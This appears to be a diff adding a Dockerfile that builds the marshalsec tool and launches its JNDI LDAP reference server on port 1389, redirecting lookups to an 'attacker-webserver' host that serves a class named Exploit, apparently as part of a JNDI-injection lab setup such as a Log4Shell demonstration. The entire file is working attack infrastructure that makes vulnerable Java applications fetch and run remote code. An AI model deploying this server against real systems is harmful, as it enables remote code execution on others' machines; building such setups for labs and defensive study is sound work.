@@ -1,0 +1,13 @@
+FROM maven:3.8-jdk-11
+EXPOSE 1389
+
+RUN mkdir /marshalsec
+COPY marshalsec/ /marshalsec
+WORKDIR /marshalsec
+RUN mvn package -DskipTests
+
+ENV HTTP_HOST=attacker-webserver
+ENV HTTP_PORT=8888
+
+# ✅ Chemin correct vers le JAR
+CMD ["sh", "-c", "java -cp /marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://${HTTP_HOST}:${HTTP_PORT}/#Exploit"]
